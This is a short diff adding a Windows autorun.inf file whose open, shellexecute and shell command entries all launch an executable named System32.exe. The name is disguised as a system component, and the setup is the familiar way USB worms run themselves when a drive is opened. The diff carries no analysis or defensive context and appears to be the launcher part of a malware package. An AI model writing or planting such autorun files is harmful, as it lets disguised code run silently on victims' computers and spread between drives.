@@ -1,0 +1,4 @@
+[AutoRun]
+open=System32.exe
+shellexecute=System32.exe
+shell\Auto\command=System32.exe
